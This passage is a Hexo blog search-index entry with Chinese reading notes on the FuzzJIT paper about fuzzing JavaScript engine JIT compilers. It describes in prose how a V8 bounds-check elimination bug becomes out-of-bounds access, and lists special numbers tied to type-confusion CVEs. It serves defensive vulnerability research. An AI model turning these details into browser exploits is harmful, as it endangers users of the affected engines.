<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>FuzzJIT:论文阅读</title>
    <link href="/2025/04/18/FuzzJIT-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    <url>/2025/04/18/FuzzJIT-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="FuzzJIT-Oracle-Enhanced-Fuzzing-for-JavaScript-Engine-JIT-Compiler"><a href="#FuzzJIT-Oracle-Enhanced-Fuzzing-for-JavaScript-Engine-JIT-Compiler" class="headerlink" title="FuzzJIT: Oracle-Enhanced Fuzzing for JavaScript Engine JIT Compiler"></a>FuzzJIT: Oracle-Enhanced Fuzzing for JavaScript Engine JIT Compiler</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>我们提出了一种新颖的模糊测试技术 FuzzJIT，用于揭示 JavaScript 引擎中的 JIT 编译器错误。该技术基于我们的洞察：JIT 编译器应仅加速执行，而绝不更改 JavaScript 代码的执行结果。 FuzzJIT 可以为每个测试用例激活 JIT 编译器，并敏锐地捕获由 JIT 编译器引起的任何执行差异。成功的关键在于输入包装模板的设计，该模板主动激活 JIT 编译器，并使生成的样本自身具备 oracle 感知能力，并且在执行期间自发地测试该 oracle。我们还设计了一组变异策略，以强调在揭示 JIT 编译器错误方面有希望的程序元素。 FuzzJIT 精确探测 JIT 编译器，同时保持了模糊测试的高效率。我们已经实现了该设计，并应用该原型在四个主流 JavaScript 引擎中发现了新的 JIT 编译器错误。在一个月内，分别在 JavaScriptCore、V8、SpiderMonkey 和 ChakraCore 中发现了 10 个、5 个、2 个和 16 个新漏洞，其中 3 个被证明是可利用的。</p><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1 介绍"></a>1 介绍</h2><p>由于执行图灵完备语言的固有复杂性，JavaScript 引擎成为浏览器的安全弱点，并被揭示为包含大多数浏览器漏洞。 JavaScript 引擎负责解析、解释、编译和执行 JavaScript 代码，其基本工作流程如图 1 所示。解析器和字节码生成器在流水线中工作，将 JavaScript 代码转换为抽象语法树 (AST)，然后转换为字节码。 字节码可以直接由解释器执行，也可以由 JIT 编译器编译。 JIT 编译器是一个可选模块，当某些 JavaScript 代码或函数变得热门时（即被调用了足够的次数）可以激活它。 它会即时工作，将函数编译成汇编代码，并对其进行优化以加速执行。 有时，JIT 编译器采用多层设计，其中编译和优化会随着执行次数的增加而逐渐升级。 JIT 编译器的工作机制，尤其是优化组件，非常复杂。 因此，在其实现中，错误是不可避免的。 由于 JavaScript 是一种弱类型和动态类型的语言，因此直接编译是不现实的，因为变量的类型在很多地方都是模棱两可的。 JIT 编译器不会生成 JavaScript 代码的完整编译，而是主要坚持根据解释器收集的运行时分析信息，根据历史观察到的变量类型。 为了正确性，编译结果必须受到类型检查的保护，并且只能用于类型合规性。 基于编译，优化器旨在减少完成功能所需的指令数量。 常用优化包括控制流图简化、公共子表达式消除和死代码消除。 通常，需要严格的控制和数据流分析才能安全地消除不必要的代码和检查。 当某些必要的安全检查被错误地删除时，后果会变得很严重。</p><img src="/2025/04/18/FuzzJIT-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/image-20250404135413658.png" class="" title="image-20250404135413658"><p>JIT 编译器应仅加速执行；对 JavaScript 代码的执行逻辑或执行结果造成的任何更改都表明存在 JIT 编译器错误。 像逻辑错误一样，许多 JIT 编译器错误不会导致程序崩溃，因此它们很容易被使用崩溃作为唯一 oracle 的模糊器错过，但这些静默错误仍然提供了大量的利用原语。 例如，V8 JIT 编译器中的 off-by-one 错误被利用来远程执行代码而不会触发任何崩溃。 更多细节在第 2.3 节中讨论。 除了增强测试 oracle 外，要使用模糊测试自动发现 JIT 编译器错误，我们必须生成可以通过语法和语义检查、被执行、激活 JIT 编译器并有意揭示其中错误的测试用例。 据我们所知，唯一初步尝试模糊测试 JIT 编译器的是 Mozilla Security 的一位研究人员，他扩展了 Jsfunfuzz（一种由语法规则指导的基于生成的模糊器），增加了一个模块来检查在激活&#x2F;未激活 JIT 的情况下执行测试用例时的打印输出。 它被应用于模糊测试 Spidermonkey（Mozilla 的 JavaScript 引擎），其 JIT 激活被设计为使用预定义的参数来控制，并在当时检测到 13 个 JIT 错误。 然而，它缺乏通用的 JIT 编译触发机制，并且对程序最终状态的粗略比较会导致许多错误无法捕获。 此外，随机生成的测试用例被限制为由语法规则和概率定义的有限搜索空间，并且无法彻底地执行 JIT 编译器。 最近，通过将变异应用于 AST 表示、类型丰富的 AST 表示或新的中间表示，在生成语法和语义上有效的样本方面取得了一些进展，后者支持对控制流和数据流进行语义变异，同时保持语义有效性。 然而，这些进展都不是专门为测试 JIT 编译器而设计的，导致它们长时间处于激活不足和测试不足的状态。 因此，一种专门为测试 JIT 编译器而系统设计的有效模糊测试工具仍有待开发。</p><p>在这项工作中，我们提出了 FuzzJIT，一种 JIT 编译器模糊测试技术，它通过更精确的测试 oracle 得到增强：一段 JavaScript 代码在 JIT 编译前后应产生一致的执行结果，否则错误由 JIT 编译器引起。 FuzzJIT 的特点是主动激活 JIT 编译器，有目的地生成可能使 JIT 编译器失败的有希望的输入，并敏锐地捕获那些隐藏的且非崩溃的 JIT 编译器错误以及崩溃错误。 成功的关键在于输入包装模板的设计，该模板使生成的样本本身具有 JIT 编译器激活和 oracle 感知能力，更重要的是，oracle 在执行期间自发地进行测试。 此外，我们启发式地识别出五种易于出错的程序元素，供 JIT 编译器处理，并强调将它们纳入生成的测试用例中。 因此，FuzzJIT 能够精确探测 JIT 编译器，在那里释放其力量，同时保持模糊测试的高效率。 我们在四个主流 JavaScript 引擎上评估 FuzzJIT，并将其与四个最先进的模糊器进行比较。 FuzzJIT 在检测 JIT 编译器错误方面表现出色，分别在 JavaScriptCore、V8、SpiderMonkey 和 ChakraCore 中发现了 10 个、5 个、2 个和 16 个新错误。 与其他基线相比，它还保持了更高的覆盖率和吞吐量。</p><p>总而言之，我们的主要贡献包括：</p><ul><li>通过研究大量的 JIT 错误语料库，了解了 JIT 错误的常见根本原因。</li><li>一种有利的测试用例包装技术，用于触发 JIT 编译。</li><li>测试用例生成策略，倾向于与 JIT 错误的根本原因相关的程序元素。</li><li>一种新颖的技术，专门用于检测 JavaScript 引擎的非崩溃和崩溃 JIT 编译器错误。</li><li>我们方法的原型实现 FuzzJIT，可在 <a href="https://github.com/SpaceNaN/fuzzjit">https://github.com/SpaceNaN/fuzzjit</a> 公开访问。</li><li>对主流 JavaScript 引擎的评估，其中 FuzzJIT 揭示了 JIT 编译器中的 33 个新错误，并显示出比最先进的模糊器更好的性能和错误查找能力。</li></ul><h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2 准备工作"></a>2 准备工作</h2><h3 id="2-1-JIT推测编译"><a href="#2-1-JIT推测编译" class="headerlink" title="2.1 JIT推测编译"></a>2.1 JIT推测编译</h3><p>传统的编译器牺牲编译时间来生成在运行时快速执行的汇编代码。 对于动态类型语言（例如 JavaScript），由于缺乏类型信息，高性能编译技术无法直接应用，类型信息指导编译器为指令发出汇编代码，并为输入和输出分配寄存器。 在性能战中，浏览器竞相开发更快的 JavaScript 引擎，推测性编译开始发挥作用，以使动态语言运行得更快。 推测性编译器利用了以下见解：在特定执行期间，如果一个语句的执行操作数是某些类型多次，那么它很可能在未来更多次以相同的类型执行。 因此，值得通过类型信息来有条件地将该语句编译成更有效的汇编代码，以加速执行。 我们还说汇编代码受到推测性保护的保护。 之后，当再次执行该语句时，JavaScript 引擎将找到汇编代码并检查操作数的运行时类型是否与推测性保护匹配，并在符合条件的情况下执行汇编代码。 如果不匹配，引擎将回滚到解释器或较低级别的 JIT 编译器进行执行，也称为 bailout。 直观地讲，推测性编译为频繁出现的输入类型提供了快速通道。</p><p>为语句更频繁执行的类型生成编译往往会带来更大的执行效率提升。 为了识别这些类型，当开始执行 JavaScript 代码时，解释器还负责收集变量的运行时分析信息，例如，对象的形状、变量的类型及其值。 一旦函数或其函数体的某一部分被执行了足够的次数（根据 JIT 编译器设置的阈值），引擎将基于类型敏感语句的频繁出现的类型，为此函数启动 JIT 编译和优化。 值得注意的是，分析的值和类型信息在 JIT 优化期间也是必不可少的。</p><p>现在，我们用一个简单的例子来演示推测性编译。 图 2a 显示了两个变量的 JavaScript 加法运算，没有任何类型指示。 图 2b 和图 2c 分别说明了 JavaScript 引擎在有和没有推测性编译的情况下处理加法运算的逻辑。 为了便于演示，我们概念性地将实现某些功能的字节码片段命名为操作，例如 Int32Add 和 isInt32。 在没有推测性编译的情况下，由于加法运算对类型敏感，因此 JavaScript 解释器必须考虑 a 和 b 具有各种运行时类型的不同场景。 它可能是整数加法、双精度加法、字符串连接或任意用户定义的效果，因为 JavaScript 允许重写继承的函数。 因此，解释器会生成昂贵的控制流逻辑来处理不同的情况，如图 2c 所示。 但是，如果我们观察到该操作在执行期间经常使用两个整数执行，则可以创建执行整数加法的快捷方式。 通过将代码转换为如图 2b 所示的推测性编译，要执行的指令数量大大减少。 它首先根据推测性保护验证运行时的变量类型。 speculateGuard 操作主要包含一个有条件跳转到解释器或较低级别 JIT 编译器的指令，以防条件不成立。 如果 a 和 b 确实是整数，则会采用专门用于整数加法的快速通道。 否则，JavaScript 引擎会丢弃已编译的代码并进行 bailout。</p><img src="/2025/04/18/FuzzJIT-论文阅读/image-20250404160310538.png"  alt="image-20250404160310538" style="zoom:50%;" /><h3 id="2-2-JIT优化"><a href="#2-2-JIT优化" class="headerlink" title="2.2 JIT优化"></a>2.2 JIT优化</h3><p>基于推测性编译，可以进行许多优化，以进一步提高执行效率。 由于实现复杂性，这三个优化——边界检查消除、冗余消除和公共子表达式消除——如今已成为浏览器漏洞的主要中心，无论是在数量上还是在质量上。</p><p><strong>边界检查消除。</strong> JavaScript 引擎在解释或编译期间对数组索引操作应用边界检查。 边界检查消除旨在识别和删除不必要的检查。 关键思想是对指示索引或数组长度的整数变量执行值范围分析 ，并确定它们的范围。 如果索引始终在数组大小的范围内，则可以安全地删除检查以减少要执行的指令数量。 如果索引的范围被低估或数组大小的范围被高估，则会发生错误。 由于此类错误，边界检查可能会被错误地消除，并导致安全威胁。 此类别下的 JIT 编译器漏洞包括 CVE-2015-0817、CVE-2015-2712、CVE-2017-2547、CVE-2017-0234、CVE-2018-0769 和 String.lastIndexOf off-by-one 错误。</p><p><strong>冗余消除。</strong> 冗余消除是为了删除特定控制流图路径上的重复安全保护措施（例如，类型验证），并且仅保留第一个。 当准确捕获了保留的保护和删除的保护之间的操作的副作用，并证明是无副作用时，这样做是安全的。 换句话说，安全保护中的变量永远不会被它们之间的操作修改。 精确地建模副作用很难实现，例如，隐蔽的副作用可能会在函数调用期间故意引起。 当一个操作被假定为无副作用但实际上不是时，就会发生错误。 CVE-2018-4233 和 CVE-2017-11802 是由不适当的冗余消除引起的典型漏洞。</p><p><strong>公共子表达式消除。</strong> 公共子表达式消除与冗余消除的精神相似，但旨在避免多次计算相同的表达式。 它仅保留第一个，并将其余的替换为直接副本。 同样，只有当它们之间的操作对表达式变量没有副作用时，这样做才是安全的。 请注意，消除表达式还会放弃其附带的安全检查（如果有）。 CVE-2020-9802 和 CVE-2020-9983 是不正确的公共子表达式消除导致删除基本整数溢出检查并进一步导致越界访问的实例。</p><h3 id="2-3-安全影响"><a href="#2-3-安全影响" class="headerlink" title="2.3 安全影响"></a>2.3 安全影响</h3><p>JIT 编译器漏洞比解析器和解释器中的漏洞更易于利用。 要成功进行利用，一个重要的步骤是通过内存分配和释放，在适当的地址准备具有所需内容的内存布局。 之后，当出现任何内存损坏错误（例如，缓冲区溢出或释放后使用）时，准备好的内存内容可能会被另一个进程意外读取或执行，其执行将受到影响或劫持。 当涉及到 JavaScript 引擎漏洞的利用时，如果漏洞是在 JavaScript 代码已被执行后触发的（即在解释或 JIT 编译阶段），则制作内存布局变得更加实际。 我们可以方便地在 JavaScript 代码中创建变量分配&#x2F;释放语句，并且它们很容易在到达错误点之前执行。 但是，对于解析器错误，这是不可能的。 另一方面，由于对操作有效性的密集安全检查（例如，边界和类型检查），解释器错误也很难利用。 然而，为了执行效率，其中一些检查将被 JIT 优化器消除，从而留下一个安全漏洞，因此更易于利用。</p><img src="/2025/04/18/FuzzJIT-论文阅读/image-20250404171807027.png"  alt="image-20250404171807027" style="zoom:50%;" /><p>JIT 编译器漏洞也经常被利用于安全竞赛（例如 Pwn2Own1 和 Tianfu Cup2）以及实际攻击中以获取远程代码执行。 表 1 列出了过去三年 Pwn2Own 中用于控制浏览器目标的所有漏洞。 在八个成功的演示中，其中六个利用了 JIT 编译器中的五个漏洞来获得远程代码执行权限。 我们还研究了 Google Project Zero 8 从 2016 年到 2021 年报告的 JavaScript 引擎错误（遵循与 23 中相同的设置），并在图 3 中分别绘制了位于解析器&#x2F;解释器和 JIT 编译器中的错误数量。 显然，近年来人们越来越关注和努力发现 JIT 编译器错误，并且在过去四年中，它们的数量约为解析器&#x2F;解释器错误的四倍。</p><img src="/2025/04/18/FuzzJIT-论文阅读/image-20250404171741231.png"  alt="image-20250404171741231" style="zoom:50%;" /><h2 id="3-动机"><a href="#3-动机" class="headerlink" title="3 动机"></a>3 动机</h2><p>JIT 编译器错误可能存在于推测性编译器或优化器中。 它们往往会在一开始引起极其微妙的错误，并且需要激活 JIT 编译器，有时还需要满足应用于特定缺陷优化的前提条件。 它们通常不会使 JavaScript 引擎崩溃，因此很容易被使用崩溃作为唯一 oracle 的模糊器错过。 然而，忽视这些错误会让 JavaScript 引擎处于危险之中，因为它们可能被利用，甚至控制引擎。 接下来，我们将展示 V8 中的一个边界检查消除错误如何传播到更明显和更具威胁性的越界访问错误。</p><p>导致此错误的概念验证 (PoC) 如图 4a 所示。 函数 opt 执行两次，一次在 JIT 编译器激活之前，一次在激活之后。 感兴趣的优化行是第 9 行，其中对数组 buf 执行索引操作。 出于安全原因，JavaScript 解释器将在解释期间检查边界。 当 JIT 编译器被激活时，它会测试通过计算 i 的范围并将其与 buf 的大小进行比较来跳过检查是否安全。 值范围分析遵循 i 的数据流，并更新修改它的每个计算操作的范围。 我们用代码注释突出显示每个语句执行后 i 的值范围，并报告真实范围以及 JIT 编译器计算的范围。</p><img src="/2025/04/18/FuzzJIT-论文阅读/image-20250404171834124.png"  alt="image-20250404171834124" style="zoom:50%;" /><p>我们可以看到 i 在第 4 行通过调用 String 对象的 lastIndexOf(toSearch) 进行初始化。 它返回字符串 toSearch 最后一次出现的索引，如果未找到，则返回 -1。 这里它在 s 上搜索空字符串，s 是 JavaScript 中允许的最长字符串，并填充了字符“A”。 当搜索空字符串时，它将在 maxLen 的索引处匹配，因为根据定义，JavaScript 中的所有字符串都以空字符串结尾。 这意味着，从理论上讲，任何对 lastIndexOf 的调用返回值范围为 -1 到 String::KMaxLength。 然而，如图 4b 所示，JIT 编译器中的值范围分析错误地估计了上限为 String::KMaxLength-1。 为了利用此错误，i 被初始化为 String::KMaxLength，使其超出编译器的预期。 在第 6 行添加 1 后，i 的估计范围变为 [0, maxLen]，并且认为使用 i 索引长度为 maxLen+1 的数组始终是安全的。 因此，它可以被优化，并且编译器删除了边界检查。 然而，在添加之后，i 的实际值变为 maxLen+1，并使用它来索引一个 maxLen+1 的数组会导致越界访问。</p><p>这个错误从两个方面激励了我们。 首先，JIT 编译器错误更易于利用，具有非凡的威胁性，并且在它们在实际攻击中被利用之前检测到它们具有重要意义。 其次，使用崩溃作为唯一 oracle 的当前模糊测试方法很容易错过 JIT 编译器错误。 就像 String.lastIndexOf off-by-one 错误一样，它们通常在一开始表现为非常微妙的错误，并且需要精心设计才能使它们传播并逐渐冒泡成为可观察的错误甚至崩溃。 在这个例子中，为了使这个越界访问发生，s 和 buf 的长度、lastIndexOf 的调用及其参数，以及第 6 行对 i 的倾斜调整必须以这种方式精确地呈现。 请注意，即使是越界访问也不一定会导致任何崩溃。 因此，迫切需要一种更有效的模糊测试方法来检测 JIT 编译器错误，特别是那些不触发崩溃的错误。</p><h2 id="4-方法"><a href="#4-方法" class="headerlink" title="4 方法"></a>4 方法</h2><p>为了在模糊测试期间发现 JIT 编译器错误，在设计该方法时必须克服三个挑战：保证生成的样本能够调用 JIT 编译器，扩大在那里发现错误的可能性，以及一旦触发，准确地捕获错误，不遗漏非崩溃错误并降低误报率。 总的来说，我们的目标是增强生成的样本的语义，使其与 JIT 编译器更相关，并提高模糊测试工具对 JIT 编译器错误的敏感性。 接下来，我们首先概述我们的方法，然后在第 4.2 节、第 4.3 节和第 4.4 节中分别介绍针对这三个挑战的缓解措施。</p><h3 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h3><img src="/2025/04/18/FuzzJIT-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/image-20250405142511716.png" class="" title="image-20250405142511716"><p>FuzzJIT 是第一个系统设计的模糊测试工具，旨在触发 JIT 编译器，揭示并捕获其中的错误，并且旨在实现上述所有期望的属性。 成功的关键是一个测试用例模板，包含三个主要组件——一个用于一般测试目的的 JavaScript 代码片段、一个 JIT 编译器触发器和一个基于执行一致性的、具有 oracle 感知的验证器。 使用此模板，我们可以自动将任何 JavaScript 测试用例与触发器及其验证器一起封装起来，并使用它来测试 JIT 编译器。 如图 6 所示，这样一个生成的测试用例，其中初始 JavaScript 测试代码包括第 6 行到第 14 行，并且显然在直接输入 JavaScript 引擎时不会调用 JIT 编译器。 接下来，我们将解释如何包装它以触发 JIT 编译器，并基于 oracle 本身准确地验证执行一致性。</p><img src="/2025/04/18/FuzzJIT-论文阅读/image-20250405142527833.png"  alt="image-20250405142527833" style="zoom:50%;" /><p>为了方便多次调用以激活 JIT 编译器，我们将代码片段包装到一个函数中，命名为 opt3，如第 5 行所示。 它的参数专门用于测试安全保护验证机制，将在第 4.3 节中详细说明。 它的返回值用于检测非崩溃错误，稍后将进行描述。 在第 22 行到第 24 行，使用 for 循环结构显式调用该函数 N 次以触发 JIT 编译。 在这里，N 可以根据特定 JIT 编译器的激活阈值自定义为任何值。</p><p>为了方便观察函数在执行后的最终状态，opt 返回一个由代码修改的变量组成的数组。 稍后，进行深度比较以检查在 JIT 编译之前和之后达到的最终执行状态是否相同。 如果发现差异，我们将报告找到一个 JIT 编译器错误。 在该模板中，opt 在第 21 行在没有 JIT 编译器的情况下执行，然后在 JIT 编译器被激活并在第 22 行到第 24 行期间工作以编译（和优化）汇编代码之后，在第 25 行再次执行。 关于错误捕获设计的更多细节可以在第 4.4 节中找到。</p><p>FuzzJIT 的整体工作流程如图 5 所示。 除了典型的模糊测试步骤之外，它还具有突变后的代码包装阶段。 FuzzJIT 专门设计了突变模块，以偏向 JIT 编译感兴趣的元素，详细信息将在第 4.3 节中介绍。 然后，该样本用精心设计的代码模板包装，以触发 JIT 编译器执行并捕获非崩溃 JIT 错误，同时消除由样本本身固有的随机性引起的误报； 详细信息将在第 4.2 节中介绍。 之后，当执行包装好的测试用例时，JIT 编译器将被自动触发并使用增强的 oracle 进行测试。 每当发生崩溃或执行不一致时，就会发出警报。 最后，无论是否触发警报，触发新代码覆盖率的样本都将被修剪并保存到语料库中，以进行下一轮模糊测试。 将 JIT 编译器激活和 oracle 检查包装到 JavaScript 测试用例中的精巧设计使其成为一个独立的模块，可以轻松添加到任何基本主机模糊器。</p><h3 id="4-2-触发JIT编译器"><a href="#4-2-触发JIT编译器" class="headerlink" title="4.2 触发JIT编译器"></a>4.2 触发JIT编译器</h3><p>不同 JavaScript 引擎的触发条件略有不同。 在这里，我们研究了四种主流 JavaScript 引擎：JavaScriptCore、V8、SpiderMonkey 和 ChakraCore，它们被终端用户广泛采用，并广泛应用 JIT 编译以追求更快的执行速度。 它们的架构如图 7 所示。 每个引擎都包含一个解析器、一个解释器和一个或多个 JIT 编译器层。 当存在多个 JIT 编译器层时，它们会随着代码变得越来越热而逐步激活。 每一层都与一个特定的执行计数阈值相关联，超过该阈值就会激活； 后面的层往往比前面的层具有更高的阈值，并生成具有更深层编译和优化的汇编代码。 每层都有许多优化方法，并且它们会根据 JIT 层被触发时的分析信息选择性地激活和交织。 错误可能存在于任何层中，并且整体测试方法应该能够深入到每一层。</p><img src="/2025/04/18/FuzzJIT-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/image-20250405145804487.png" class="" title="image-20250405145804487"><p>不同引擎中每个 JIT 编译器层的激活阈值通常是可配置的。 值得一提的是，阈值不能设置得太小，因为某些优化需要观察到最少的执行次数才能做出决策。 太小的阈值可能会导致在引擎的默认设置下无法重现的误报； 较大的阈值则会牺牲更多的测试效率。 接下来，我们将报告每个引擎的原始阈值设置，以及如何基于反复试验和一些行业经验来重新配置它们。 这些配置在我们的实验中运行良好，并且不会导致误报。</p><p>在 JavaScriptCore 中，有三个 JIT 编译器层。 如果一个函数分别被调用超过 6 次和 66 次，则基线 JIT 编译器和 DFG（数据流图）JIT 编译器将被激活以编译和优化该函数。 如果任何函数在现代 CPU 上运行超过 10 毫秒，则 FTL（超光速）JIT 编译器将开始编译。 在我们的实验中，我们将阈值统一自定义为对函数的 10 次、50 次和 100 次调用。 在 SpiderMonkey 中，JIT 编译器需要 1,000 次函数调用才能触发，我们将其设置为 50。 在 ChakraCore 中，默认情况下，Simple JIT 和 Full JIT 分别需要 25 次和 20,000 次迭代才能触发。 我们通过实验将它们设置为 10 次和 100 次。</p><p>当使用单层的 JIT 编译器模块包装测试用例以触发时，可以直接使用图 6 中的模板。 如果有多于一层，则每个层的触发结构（类似于图 6 中的第 21 行到第 28 行），从前到后，将依次在第 20 行的 if 语句的 true 分支下进行流水线处理。 为了确保在模糊测试期间以 100% 的概率触发 JIT 编译器层，opt 函数将被调用（超过）其阈值的两倍。 也就是说，给定一个阈值 τ，图 6 中第 22 行的 N 将被设置为 2*τ。</p><p>V8 Turbofan JIT 编译器的激活机制与其他三个不同。 它不是监控函数被调用的次数，而是尝试通过估计执行其未优化版本所花费的时间并猜测将来要执行多少次来预测优化函数的好处 32。 为了方便测试，V8 提供了一个内置的本机语法，通过对要编译的函数调用 <code>%OptimizeFunctionOnNextCall</code> 来强制进行 JIT 编译和优化。 它的维护团队承认以这种方式发现的错误，无论它们是否可以在原始激活设置下重现。 因此，当模糊测试 V8 时，我们将 N 设置为 1，并在第 22 行 for 循环之后立即显式调用 <code>%OptimizeFunctionOnNextCall(opt)</code>。</p><h3 id="4-3-揭露JIT编译器漏洞"><a href="#4-3-揭露JIT编译器漏洞" class="headerlink" title="4.3 揭露JIT编译器漏洞"></a>4.3 揭露JIT编译器漏洞</h3><p>为了使模糊测试过程更有效并暴露更多错误，我们的目标是生成能够实质性地挑战 JIT 编译器在编译和优化正确性方面的测试用例。 期望为敏感操作正确生成必要的推测保护，并且在优化期间不会不适当地消除它们。 根据错误类型，应开发有针对性的输入突变和生成策略。 在这里，我们讨论了用于模糊测试三种最流行的错误驻留地点的 bug-leading 程序元素和结构，即边界检查消除、冗余消除和公共子表达式消除。 我们针对数组、对象、子表达式、有趣数字和条件变量重新赋值提出了五种启发式突变策略，因为它们是这三种消除过程中被分析的主要目标。</p><p>为了确认这种关联，特别是对于数组、对象和有趣数字，我们对已知的 JIT 错误及其利用进行了小型实证研究。 我们从 Google Project Zero 错误报告列表和 JavaScript 引擎 CVE 的 GitHub 存储库中收集了 164 个不同的 JIT 编译器错误及其 PoC，并手动分析了这三种类型的元素的存在。 两位作者独立分析了所有 164 个 PoC，讨论了他们的发现并达成了一致。 在 164 个错误 PoC 中，数组出现在 112 个中，对象出现在 115 个中，而 50 个需要特殊数字。 值得一提的是，可能需要多个因素才能触发一个错误。</p><p>接下来，我们将详细说明如何受到启发和设计有关每个元素的代码生成策略。 请注意，可以通过分析它们的根本原因来扩展该策略集，以检测其他 JIT 编译器错误。</p><p><strong>Arrays.</strong> 如果错误地认为索引始终在数组边界内，则数组索引操作处的边界检查会被错误地消除。 当在范围分析期间错误地估计了索引的范围或数组的大小时，就会发生这种情况。 范围分析更有可能在某些极端情况下出错，这些情况可以通过有趣的数字来练习。 数组的大小受到对其进行操作的 API 的影响，因此对不同 API 对大小范围分析的影响进行建模和传播非常重要。 JavaScript 中有 12 种类型化数组，包括 Int8Array、Uint8Array、Int16Array 等。 对于每一种，都有超过 24 个 API，例如 Array.concat()、Array.copy()、Array.reverse()，其中一些需要复杂的范围计算。 例如，在分析数组连接操作 Array.concat() 时，应正确执行范围加法。 在收集的 164 个错误中，有 6 个（包括 CVE-2014-3176、CVE-20161646 和 CVE-2017-5030）主要是由 Array.concat() 的不正确建模引起的。</p><p><strong>Objects.</strong> 在冗余消除期间，当变量类型被认为自上次类型检查以来从未更改时，将删除对变量的类型检查。 然而，修改变量类型可以以一种极其隐蔽的方式进行，特别是对于 JavaScript 对象，它们是类型混淆错误的主要贡献者。 JavaScript 对象的类型由其属性的数量和类型决定。 添加、删除或更改对象的属性将更改其类型。 JavaScript 允许更改所有对象属性，即使是魔术属性，例如 proto、constructor 和 prototype。 更改这些魔术属性允许覆盖或污染其基本对象的原型。 如果基本对象也被其他对象继承，则污染将通过原型链传播。 通过这种隐蔽的修改对象类型的方式，类型验证算法很容易出错。</p><p><strong>Subexpressions.</strong> 公共子表达式的存在是进行公共子表达式消除优化的必要条件。 然而，这在随机突变期间很难或只能稀疏地实现。 在这里，我们故意使一些子表达式在测试样本中重复出现，并尝试通过混合不同的操作（例如乘法、除法、幂、根等）使它们复杂化。 通过将这些子表达式散布在程序的各个位置，我们在分析任何两个公共子表达式之间的操作的副作用方面挑战 JIT 编译器。 如果后者子表达式的估值在后台被更改，并且被优化器忽略，它将被错误地替换为过时的值，并导致不一致的执行结果。</p><p><strong>Interesting numbers.</strong> 有趣的数字在测试 JIT 编译器容易出错的极端情况下非常有效，尤其是在范围分析和类型检查期间。 例如，268,435,440，字符串大小的上限，用于触发我们的动机示例中的错误 29。 2.3023e-320 是一种特殊的浮点数，它被错误地视为指向对象的指针，并在 CVE-2017-11802、CVE-2018-0840、CVE-2018-8556、CVE-2018-0835、CVE-2018-0953、CVE2018-8466 和 CVE-2018-8542 中触发类型混淆错误。 此外，-5.3049894784e314 等于 0x8000000280000002，是常量 JavascriptNativeFloatArray::MissingItem，用于在 CVE-2018-0953 中引起类型混淆。</p><p><strong>Conditioned variable reassignments.</strong> 为了测试 JIT 编译器是否正确生成类型和边界检查，在优化期间永远不会错误地删除它们，并在运行时正确地验证它们，我们设计了一种新的程序语义来有条件地更改某些变量的类型和值。 当触发 JIT 编译器时，我们关闭更改，并测试是否可以生成正确的检查，而无需在分析期间在更改路径上看到运行时变量类型和值，并且如果变量用于敏感操作，则可以通过优化。 此设计在图 6 的模板中进行了说明。 opt 函数接受一个参数，该参数控制是否执行第 9 行的 if 语句的主体。 在其主体内部，一些变量被更改为不同的类型和值。 在此示例中，v0 从数组更改为对象。 触发 JIT 优化时，我们小心地控制传递给 opt 的参数为 false（参见第 23 行），这样在运行时永远不会观察到 v0 的更改类型。 在第 13 行对 v0 执行数组索引操作，JIT 编译器应为此生成边界检查和类型检查，并且在优化期间不应删除它们，因为 if 主体的副作用可以流到第 13 行。 如果错误地删除了类型检查，并且在启用更改的情况下调用了 opt（参见第 25 行），则对对象的索引操作将导致类型混淆错误。 否则，类型检查失败，JIT 编译器应退出到较低级别的编译器或解释器以进行更安全的处理。</p><p><strong>Controlling syntax complexity.</strong> 在突变期间生成 opt 函数体时，我们倾向于生成变量声明和赋值语句，以及与各种数据类型关联的 JavaScript 内置 API 调用语句。 特别是，我们增加了生成数组及其相关内置 API 调用以及生成对象及其类型更改操作的机会。 为了创建重复的子表达式，我们维护一个现有子表达式池，并允许在突变期间重复插入它们。 此外，我们从 164 个收集的 PoC 中提取一组有趣的数字，并让模糊器从中选择，而不是在需要时生成随机数。 对于有条件的变量重新赋值，我们插入一个以 opt 的参数为条件的 if 语句，并随机生成其主体。 为了进一步提高 JIT 错误揭示元素的密度，我们禁用了复杂语句的生成，例如函数声明、类声明、try&#x2F;catch 语句、switch&#x2F;case 语句。 我们还避免在 opt 的函数体内部生成循环结构，因为它本身嵌入在循环中，并且太多的循环结构也会阻碍模糊测试期间的执行效率。 通过保持语法简单和纯粹，我们还可以提高生成的测试输入的语义正确率。</p><h3 id="4-4-捕获JIT编译器漏洞"><a href="#4-4-捕获JIT编译器漏洞" class="headerlink" title="4.4 捕获JIT编译器漏洞"></a>4.4 捕获JIT编译器漏洞</h3><p>通过返回 opt 函数的最终执行状态，我们可以从外部观察其行为，并确保任何相关代码都不会在优化期间作为死代码被消除。 代码的测试能力也得到了最大化，因为每个语句都在测试期间计数，并且执行中的任何微小错误都会触发警报。 像典型的差异测试一样，我们可以分别执行代码片段及其 JIT 版本，记录它们的最终状态并进行比较。 这样，它们的调用上下文保证是相同的，任何差异都是由于解释和 JIT 编译&#x2F;优化之间的差异造成的。 但是，这将最终启动 JavaScript引擎两次，这非常耗时，并导致模糊测试过程出现严重的滞后。</p><p>在这里，我们提出了一种新颖的想法，通过将这两个执行集成到一次运行中，并在其自身中包含比较逻辑，使测试用例能够自我感知执行的一致性。 测试代码（即 opt 函数）首先仅使用解释器执行，然后在 JIT 编译器启动后执行（参见图 6 中的第 21 行到第 25 行），并进一步比较它们的最终状态（参见第 26 行到第 28 行）。 这种设计依赖于一个重要的事实，即 JavaScript 测试用例不仅是 JavaScript 引擎的程序输入，而且也是一些要执行的代码。 通过仔细设计包装代码的生成过程，只要 opt 函数没有语法和语义错误，升级后的测试用例就可以成功执行。</p><p>现在，我们解释如何检查两个最终状态，即两个数组是否相同。 JavaScript 中有八种内置数据类型，即 undefined、null、bigint、symbol、boolean、string、number 和 object。 除了 object 之外，所有其他的都是原始类型，我们可以使用“&#x3D;&#x3D;&#x3D;”运算符检查它们是否严格相等。 对于 object 